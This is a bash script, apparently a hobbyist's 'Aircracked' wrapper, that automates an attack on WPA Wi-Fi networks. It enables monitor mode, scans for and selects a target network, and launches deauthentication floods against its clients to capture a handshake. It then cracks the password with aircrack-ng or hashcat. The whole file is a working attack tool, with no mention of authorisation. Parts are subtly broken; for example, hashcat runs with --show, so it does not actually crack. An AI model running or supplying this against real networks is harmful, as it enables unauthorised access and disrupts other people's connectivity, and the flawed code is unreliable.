#!/bin/bash
# Today I learned a lot about how useful functions are, also it's currently 10:45 PM and I'm tired

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# State variables
STAGE=1
INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_CLIENT=""
CAPTURE_FILE=""

# Args
SHOW_HIDDEN=0

for arg in "$@"; do
  case "$arg" in
  --show-hidden) SHOW_HIDDEN=1 ;;
  esac
done

# Dependency checks
check_dependencies() {
  local warnings=()

  if ! command -v aircrack-ng &>/dev/null; then
    echo -e "\n  ${RED}[✗] aircrack-ng is not installed — this is required.${NC}"
    echo -e "      Install with: ${BOLD}sudo apt install aircrack-ng${NC}\n"
    exit 1
  fi

  if ! command -v hashcat &>/dev/null; then
    warnings+=("hashcat is not installed — hashcat cracking will not work. Install with: sudo apt install hashcat")
  fi

  if ! command -v hcxpcapngtool &>/dev/null; then
    warnings+=("hcxtools is not installed — hashcat cracking will not work. Install with: sudo apt install hcxtools")
  fi

  if [[ ${#warnings[@]} -gt 0 ]]; then
    echo -e ""
    for w in "${warnings[@]}"; do
      echo -e "  ${YELLOW}[!] $w${NC}"
    done
    echo -ne "\n  Press Enter to continue..."
    read -r
  fi
}

# Helper functions
print_header() {
  clear
  local title="Aircracked -- StapleTT"
  local width=44
  local padding=$(((width - ${#title}) / 2))
  local padstr=$(printf '%*s' "$padding" '')

  echo -e "${BOLD}${CYAN}"
  echo "╔═════════════════════════════════════════════╗"
  echo "║${padstr}${title}${padstr} ║"
  echo "╚═════════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  Stage ${BOLD}$STAGE / 6${NC}: ${BOLD}$1${NC}"
  echo -e "  ─────────────────────────────────────────"
}

print_status() {
  echo -e "\n${BOLD}Current Session Info:${NC}"
  [[ -n "$INTERFACE" ]] && echo -e "  Interface   : ${GREEN}$INTERFACE${NC}"
  [[ -n "$TARGET_BSSID" ]] && echo -e "  BSSID       : ${GREEN}$TARGET_BSSID${NC}"
  [[ -n "$TARGET_CHANNEL" ]] && echo -e "  Channel     : ${GREEN}$TARGET_CHANNEL${NC}"
  [[ -n "$CAPTURE_FILE" ]] && echo -e "  Capture file: ${GREEN}$CAPTURE_FILE-01.cap${NC}"
  echo ""
}

prompt() {
  echo -ne "${YELLOW}  > $1: ${NC}"
  read -r REPLY
  echo "$REPLY"
}

confirm() {
  echo -ne "${YELLOW}  > $1 [y/N]: ${NC}"
  read -r yn
  [[ "$yn" =~ ^[Yy]$ ]]
}

bail() {
  echo -e "\n${RED}  [!] $1${NC}"
  exit 1
}

cleanup() {
  echo -e "\n  ${CYAN}[*] Restoring network connectivity...${NC}"
  sudo systemctl restart NetworkManager
  echo -e "  ${GREEN}[✓] NetworkManager restarted.${NC}\n"
}

trap cleanup EXIT

advance_stage() {
  STAGE=$((STAGE + 1))
}

# ─────────────────────────────────────────
#  Stage 1 — Monitor Mode
# ─────────────────────────────────────────
stage_monitor() {
  while true; do
    print_header "Enable Monitor Mode"

    mapfile -t IFACES < <(ip -br link show | awk '{print $1}')

    if [[ ${#IFACES[@]} -eq 0 ]]; then
      bail "No network interfaces found."
    fi

    echo -e "  Available interfaces:\n"
    for i in "${!IFACES[@]}"; do
      STATE=$(ip -br link show "${IFACES[$i]}" | awk '{print $2}')
      echo -e "    ${BOLD}[$((i + 1))]${NC} ${IFACES[$i]}  (${STATE})"
    done
    echo -e "    ${BOLD}[q]${NC} Quit\n"

    # Validate selection inline at the prompt
    while true; do
      echo -ne "  ${YELLOW}Select an interface: ${NC}"
      read -r CHOICE

      # Quit on q/Q
      if [[ "${CHOICE,,}" == "q" ]]; then
        echo -e "\n  Goodbye.\n"
        exit 0
      fi

      # Accept valid number in range
      if [[ "$CHOICE" =~ ^[0-9]+$ ]] &&
        [[ "$CHOICE" -ge 1 ]] &&
        [[ "$CHOICE" -le "${#IFACES[@]}" ]]; then
        break
      fi

      echo -e "  ${RED}[!] Invalid selection. Enter a number between 1 and ${#IFACES[@]}, or 'q' to quit.${NC}"
    done

    INTERFACE="${IFACES[$((CHOICE - 1))]}"

    # Check for monitor mode support
    echo -e "\n  ${CYAN}[*] Checking if $INTERFACE supports monitor mode...${NC}\n"

    if ! iw phy "$(iw dev "$INTERFACE" info 2>/dev/null | awk '/wiphy/{print "phy"$2}')" \
      info 2>/dev/null | grep -q "monitor"; then
      echo -e "  ${RED}[!] $INTERFACE does not support monitor mode.${NC}"
      echo -e "  ${YELLOW}    Please choose a different interface.${NC}\n"
      sleep 2
      continue
    fi

    echo -e "  ${GREEN}[✓] $INTERFACE supports monitor mode.${NC}"
    break
  done

  confirm "Put $INTERFACE into monitor mode?" || bail "Aborted."

  echo -e "\n  ${RED}${BOLD}[!] WARNING: Continuing will kill network manager and related"
  echo -e "      processes, and you will lose network connectivity.${NC}\n"

  confirm "Are you sure you want to continue?" || bail "Aborted."

  echo -e "\n  ${CYAN}[*] Killing interfering processes...${NC}\n"
  sudo airmon-ng check kill

  echo -e "\n  ${CYAN}[*] Enabling monitor mode on $INTERFACE...${NC}\n"
  sudo airmon-ng start "$INTERFACE"

  # Reset terminal state in case airmon-ng left it in a bad state
  stty sane

  echo -e "\n  ${GREEN}[✓] Monitor mode set on $INTERFACE${NC}"
  advance_stage
}

# ─────────────────────────────────────────
#  Detect current terminal emulator (yes I'm aware this is inefficient)
# ─────────────────────────────────────────
detect_terminal() {
  local term_pid term_exe

  term_pid=$PPID
  while [[ $term_pid -gt 1 ]]; do
    term_exe=$(cat /proc/$term_pid/comm 2>/dev/null)

    case "$term_exe" in
    kitty | alacritty | wezterm | foot)
      TERMINAL="$term_exe"
      return 0
      ;;
    gnome-terminal* | gnome-terminal-server)
      TERMINAL="gnome-terminal"
      return 0
      ;;
    xfce4-terminal)
      TERMINAL="xfce4-terminal"
      return 0
      ;;
    konsole)
      TERMINAL="konsole"
      return 0
      ;;
    qterminal)
      TERMINAL="qterminal"
      return 0
      ;;
    lxterminal)
      TERMINAL="lxterminal"
      return 0
      ;;
    xterm)
      TERMINAL="xterm"
      return 0
      ;;
    esac

    term_pid=$(awk '{print $4}' /proc/$term_pid/stat 2>/dev/null)
  done

  if [[ -n "$TERM_PROGRAM" ]]; then
    TERMINAL="$TERM_PROGRAM"
    return 0
  fi

  return 1
}

# ─────────────────────────────────────────
#  Launch a command in a new terminal window
# ─────────────────────────────────────────
launch_in_terminal() {
  local cmd="$1"
  local flag
  flag=$(mktemp /tmp/aircracked_done_XXXX)
  rm -f "$flag" # Remove so we can watch for its creation

  local wrapped="$cmd; touch '$flag'"

  case "$TERMINAL" in
  kitty) "$TERMINAL" -- bash -c "$wrapped" & ;;
  alacritty) "$TERMINAL" -e bash -c "$wrapped" & ;;
  wezterm) "$TERMINAL" start -- bash -c "$wrapped" & ;;
  foot) "$TERMINAL" bash -c "$wrapped" & ;;
  *) "$TERMINAL" -e "bash -c \"$wrapped\"" & ;;
  esac

  # Return the flag path so the caller can wait on it
  echo "$flag"
}

wait_for_terminal() {
  local flag="$1"
  local message="${2:-Waiting for window to close...}"

  echo -e "\n  ${YELLOW}[*] $message${NC}"
  while [[ ! -f "$flag" ]]; do
    sleep 0.5
  done
  rm -f "$flag"

  while IFS= read -r -t 0 _; do :; done 2>/dev/null
}

# ─────────────────────────────────────────
#  Stage 2 — Network Scan
# ─────────────────────────────────────────
stage_scan() {
  print_header "Scan for Networks"
  print_status

  # Detect terminal once up front
  if ! detect_terminal; then
    echo -e "  ${RED}[!] Could not auto-detect terminal emulator.${NC}"
    TERMINAL=$(prompt "Enter your terminal executable (e.g. kitty, alacritty, xterm)")
    [[ -z "$TERMINAL" ]] && bail "No terminal provided."
  else
    echo -e "  ${CYAN}[*] Detected terminal: ${BOLD}$TERMINAL${NC}\n"
  fi

  echo -e "  ${CYAN}[*] Launching airodump-ng in a new terminal window...${NC}"
  echo -e "  ${YELLOW}    Press Ctrl+C in that window when you've found your target.${NC}\n"

  confirm "Launch scan now?" || bail "Aborted."

  SCAN_OUTPUT=$(mktemp /tmp/airodump_scan_XXXX.csv)

  local flag
  flag=$(launch_in_terminal "sudo airodump-ng --output-format csv -w ${SCAN_OUTPUT%.csv} '$INTERFACE'")
  wait_for_terminal "$flag" "Scan window launched. Close it when you've found your target."

  # airodump appends -01 to the filename
  SCAN_CSV="${SCAN_OUTPUT%.csv}-01.csv"

  if [[ ! -f "$SCAN_CSV" ]]; then
    echo -e "\n  ${RED}[!] No scan output found. Did airodump run correctly?${NC}\n"
    confirm "Retry scan?" && stage_scan
    bail "No scan data."
  fi

  # Parse networks from the CSV (above the blank line separator)
  # Fields: BSSID[0], First seen[1], Last seen[2], Channel[3], Speed[4],
  #         Privacy[5], Cipher[6], Auth[7], Power[8], Beacons[9],
  #         IV[10], LAN IP[11], ID-length[12], ESSID[13], Key[14]
  mapfile -t NETWORKS < <(awk '
        /^BSSID/ { found=1; next }
        found && /^$/ { exit }
        found && NF > 0 { print }
    ' "$SCAN_CSV")

  if [[ ${#NETWORKS[@]} -eq 0 ]]; then
    echo -e "\n  ${RED}[!] No networks parsed from scan output.${NC}\n"
    bail "Empty scan data."
  fi

  echo -e "\n  Available networks:\n"
  echo -e "    ${BOLD}$(printf '%-4s %-20s %-19s %-5s %s' '#' 'ESSID' 'BSSID' 'CH' 'AUTH')${NC}"
  echo -e "    ──────────────────────────────────────────────────────"

  local display_indices=()
  for i in "${!NETWORKS[@]}"; do
    IFS=',' read -ra FIELDS <<<"${NETWORKS[$i]}"
    N_ESSID=$(echo "${FIELDS[13]}" | xargs)

    if [[ -z "$N_ESSID" && "$SHOW_HIDDEN" -eq 0 ]]; then
      continue
    fi

    [[ -z "$N_ESSID" ]] && N_ESSID="(hidden)"

    N_BSSID=$(echo "${FIELDS[0]}" | xargs)
    N_CHAN=$(echo "${FIELDS[3]}" | xargs)
    N_AUTH=$(echo "${FIELDS[7]}" | xargs)

    display_indices+=("$i")
    printf "    ${BOLD}[%d]${NC} %-20s %-19s %-5s %s\n" \
      "${#display_indices[@]}" "$N_ESSID" "$N_BSSID" "$N_CHAN" "$N_AUTH"
  done
  echo -e "    ${BOLD}[q]${NC} Quit\n"

  if [[ ${#display_indices[@]} -eq 0 ]]; then
    echo -e "  ${YELLOW}[!] No networks found. Try running with --show-hidden.${NC}\n"
    bail "No networks to display."
  fi

  while true; do
    echo -ne "  ${YELLOW}Select a network: ${NC}"
    read -r CHOICE

    if [[ "${CHOICE,,}" == "q" ]]; then
      echo -e "\n  Goodbye.\n"
      exit 0
    fi

    if [[ "$CHOICE" =~ ^[0-9]+$ ]] &&
      [[ "$CHOICE" -ge 1 ]] &&
      [[ "$CHOICE" -le "${#display_indices[@]}" ]]; then
      break
    fi

    echo -e "  ${RED}[!] Invalid selection. Enter a number between 1 and ${#display_indices[@]}, or 'q' to quit.${NC}"
  done

  IFS=',' read -ra SELECTED <<<"${NETWORKS[${display_indices[$((CHOICE - 1))]}]}"
  TARGET_BSSID=$(echo "${SELECTED[0]}" | xargs)
  TARGET_CHANNEL=$(echo "${SELECTED[3]}" | xargs)
  local selected_essid
  selected_essid=$(echo "${SELECTED[13]}" | xargs)
  [[ -z "$selected_essid" ]] && selected_essid="hidden"

  echo -e "\n  ${GREEN}[✓] Selected: $selected_essid — $TARGET_BSSID (CH $TARGET_CHANNEL)${NC}"

  # Clean ESSID for use as a filename (replace spaces/special chars with _)
  local safe_essid
  safe_essid=$(echo "$selected_essid" | tr -cs '[:alnum:]_-' '_' | tr -s '_')

  # Create output directory and build capture file path
  local out_dir="$HOME/.aircracked"
  mkdir -p "$out_dir"
  CAPTURE_FILE="$out_dir/${safe_essid}_$(date +%Y%m%d_%H%M%S)"

  echo -e "  ${CYAN}[*] Capture will be saved to: ${BOLD}$CAPTURE_FILE-01.cap${NC}"

  sudo rm -f /tmp/airodump_scan_*

  echo -e "\n  ${GREEN}[✓] Target info recorded.${NC}"

  sleep 2

  advance_stage
}

# ─────────────────────────────────────────
#  Stage 3 — Capture + Deauth
# ─────────────────────────────────────────
stage_capture() {
  print_header "Capture Handshake & Send Deauth"
  print_status

  # Focused capture
  echo -e "  ${CYAN}[*] Step 1 — Starting focused capture on $TARGET_BSSID (CH $TARGET_CHANNEL)${NC}\n"
  confirm "Launch capture window?" || bail "Aborted."

  launch_in_terminal "sudo airodump-ng -c '$TARGET_CHANNEL' --bssid '$TARGET_BSSID' -w '$CAPTURE_FILE' '$INTERFACE'" >/dev/null

  echo -e "\n  ${YELLOW}[*] Capture window launched. Leave it running in the background.${NC}"
  echo -e "  ${YELLOW}    Wait for it to initialize before continuing.${NC}"
  while IFS= read -r -t 0 _; do :; done 2>/dev/null

  #Deauth
  echo -e "\n  ${CYAN}[*] Step 2 — Send deauthentication packets${NC}\n"

  while true; do
    echo -ne "  ${YELLOW}> How many deauth packets to send (leave blank to skip, 0 for continuous): ${NC}"
    read -r PACKET_COUNT

    [[ -z "$PACKET_COUNT" ]] && PACKET_COUNT="" && break
    [[ "$PACKET_COUNT" =~ ^[0-9]+$ ]] && break
    echo -e "  ${RED}[!] Please enter a valid number or leave blank to skip.${NC}"
  done

  if [[ -z "$PACKET_COUNT" ]]; then
    echo -e "\n  ${YELLOW}[*] Skipping deauth.${NC}"
  else
    confirm "Send deauth to $TARGET_BSSID now?" || bail "Aborted."
    launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'" >/dev/null
    echo -e "\n  ${YELLOW}[*] Deauth window launched.${NC}"
    echo -ne "  ${YELLOW}    Press Enter when ready to continue...${NC}"
    read -r
    while IFS= read -r -t 0 _; do :; done 2>/dev/null
  fi

  # Confirm handshake
  echo -e "\n  ${YELLOW}[*] Watch the capture window for 'WPA handshake: $TARGET_BSSID'.${NC}"
  echo -e "  ${YELLOW}    Close the capture window once you see it.${NC}\n"
  echo -ne "  ${YELLOW}    Press Enter once the capture window is closed...${NC}\n"
  read -r
  while IFS= read -r -t 0 _; do :; done 2>/dev/null

  confirm "Handshake successfully captured?" || bail "Aborted."

  echo -e "\n  ${GREEN}[✓] Handshake captured: ${BOLD}$CAPTURE_FILE-01.cap${NC}"
  advance_stage
}

# ─────────────────────────────────────────
#  Stage 4 — Choose Cracking Tool
# ─────────────────────────────────────────
stage_choose_cracker() {
  print_header "Choose Cracking Method"
  print_status

  echo -e "  How would you like to crack the handshake?\n"
  echo -e "    ${BOLD}[1]${NC} aircrack-ng  (CPU, simple)"
  echo -e "    ${BOLD}[2]${NC} hashcat      (GPU accelerated)"
  echo -e "    ${BOLD}[q]${NC} Quit\n"

  while true; do
    echo -ne "  ${YELLOW}Select an option: ${NC}"
    read -r CHOICE

    case "${CHOICE,,}" in
    1)
      CRACKER="aircrack"
      advance_stage
      return
      ;;
    2)
      CRACKER="hashcat"
      advance_stage
      return
      ;;
    q)
      echo -e "\n  Goodbye.\n"
      exit 0
      ;;
    *) echo -e "  ${RED}[!] Invalid selection. Enter 1, 2, or 'q'.${NC}" ;;
    esac
  done
}

# ─────────────────────────────────────────
#  Stage 5a — Crack with aircrack-ng
# ─────────────────────────────────────────
stage_crack_aircrack() {
  print_header "Crack Handshake — aircrack-ng"
  print_status

  while true; do
    echo -ne "  ${YELLOW}  > Path to wordlist: ${NC}"
    read -r WORDLIST

    [[ -z "$WORDLIST" ]] && echo -e "  ${RED}[!] Wordlist path required.${NC}" && continue
    [[ ! -f "$WORDLIST" ]] && echo -e "  ${RED}[!] File not found: $WORDLIST${NC}" && continue
    break
  done

  confirm "Start cracking with aircrack-ng?" || bail "Aborted."

  local log="$HOME/.aircracked/aircrack_$$.log"

  echo -ne "  ${YELLOW}[*] Cracking in progress...${NC}"
  sudo aircrack-ng -b "$TARGET_BSSID" -w "$WORDLIST" "$CAPTURE_FILE-01.cap" >"$log" 2>&1 &
  local pid=$!
  while kill -0 $pid 2>/dev/null; do
    for s in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
      echo -ne "\r  ${YELLOW}[*] Cracking in progress... $s${NC}"
      sleep 0.1
    done
  done
  echo -ne "\r  ${YELLOW}[*] Cracking complete.        ${NC}\n"

  sudo aircrack-ng -b "$TARGET_BSSID" -w "$WORDLIST" "$CAPTURE_FILE-01.cap" >"$log" 2>&1

  CRACKED_PASSWORD=$(grep -oP '(?<=KEY FOUND! \[ ).*(?= \])' "$log" 2>/dev/null | head -1)
  sudo rm -f "$log"

  advance_stage
}

# ─────────────────────────────────────────
#  Stage 5b — Crack with hashcat
# ─────────────────────────────────────────
stage_crack_hashcat() {
  print_header "Crack Handshake — hashcat"
  print_status

  while true; do
    echo -ne "  ${YELLOW}  > Path to wordlist: ${NC}"
    read -r WORDLIST

    [[ -z "$WORDLIST" ]] && echo -e "  ${RED}[!] Wordlist path required.${NC}" && continue
    [[ ! -f "$WORDLIST" ]] && echo -e "  ${RED}[!] File not found: $WORDLIST${NC}" && continue
    break
  done

  confirm "Start cracking with hashcat?" || bail "Aborted."

  local cap_dir
  cap_dir=$(dirname "$CAPTURE_FILE")
  local cap_name
  cap_name=$(basename "$CAPTURE_FILE")
  local cleaned="$cap_dir/${cap_name}_cleaned.cap"
  local hash="$cap_dir/${cap_name}.hc22000"

  # Clean the capture file
  echo -e "\n  ${CYAN}[*] Step 1 — Cleaning capture file...${NC}"
  sudo wpaclean "$cleaned" "$CAPTURE_FILE-01.cap" >/dev/null 2>&1

  if [[ ! -f "$cleaned" ]]; then
    echo -e "\n  ${RED}[!] Cleaned capture file not found. Did wpaclean run correctly?${NC}"
    bail "Aborted."
  fi
  echo -e "  ${GREEN}[✓] Capture cleaned.${NC}"
  sleep 1

  # Convert to hc22000
  echo -e "\n  ${CYAN}[*] Step 2 — Converting to hashcat format...${NC}"
  sudo hcxpcapngtool -o "$hash" "$cleaned" >/dev/null 2>&1

  if [[ ! -f "$hash" ]]; then
    echo -e "\n  ${RED}[!] Hash file not found. Did hcxpcapngtool run correctly?${NC}"
    bail "Aborted."
  fi
  echo -e "  ${GREEN}[✓] Hash file ready: $hash${NC}"
  sleep 1

  # Remove cleaned .cap now that .hc22000 is generated
  sudo rm -f "$cleaned"
  echo -e "  ${GREEN}[✓] Cleaned capture removed.${NC}\n"
  sleep 1

  # Run hashcat
  echo -e "  ${CYAN}[*] Running hashcat...${NC}"
  local log="$HOME/.aircracked/hashcat_$$.log"

  sudo hashcat -m 22000 --quiet --show "$hash" "$WORDLIST" >"$log" 2>&1 &
  local pid=$!
  while kill -0 $pid 2>/dev/null; do
    for s in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
      echo -ne "\r  ${YELLOW}[*] Cracking in progress... $s${NC}"
      sleep 0.1
    done
  done
  echo -ne "\r  ${YELLOW}[*] Cracking complete.        ${NC}\n"

  CRACKED_PASSWORD=$(grep -oP '(?<=:)[^:]+$' "$log" 2>/dev/null | head -1)
  sudo rm -f "$log"

  advance_stage
}

# ─────────────────────────────────────────
#  Stage 6 — Summary
# ─────────────────────────────────────────
stage_summary() {
  print_header "Summary"
  print_status

  echo -e "  Session complete.\n"
  echo -e "  ${BOLD}Wordlist used:${NC} $WORDLIST"
  echo -e "  ${BOLD}Tool used    :${NC} $CRACKER\n"

  if [[ -n "$CRACKED_PASSWORD" ]]; then
    echo -e "  ${GREEN}${BOLD}[✓] Password found: $CRACKED_PASSWORD${NC}"
  else
    echo -e "  ${RED}[!] Password not found. The wordlist did not contain the password.${NC}"
  fi
}

# ─────────────────────────────────────────
#  Main loop
# ─────────────────────────────────────────
main() {
  check_dependencies

  case $STAGE in
  1) stage_monitor ;&
  2) stage_scan ;&
  3) stage_capture ;&
  4) stage_choose_cracker ;&
  5)
    if [[ "$CRACKER" == "aircrack" ]]; then
      stage_crack_aircrack
    else
      stage_crack_hashcat
    fi
    ;&
  6) stage_summary ;;
  *) bail "Unknown stage." ;;
  esac
}

main
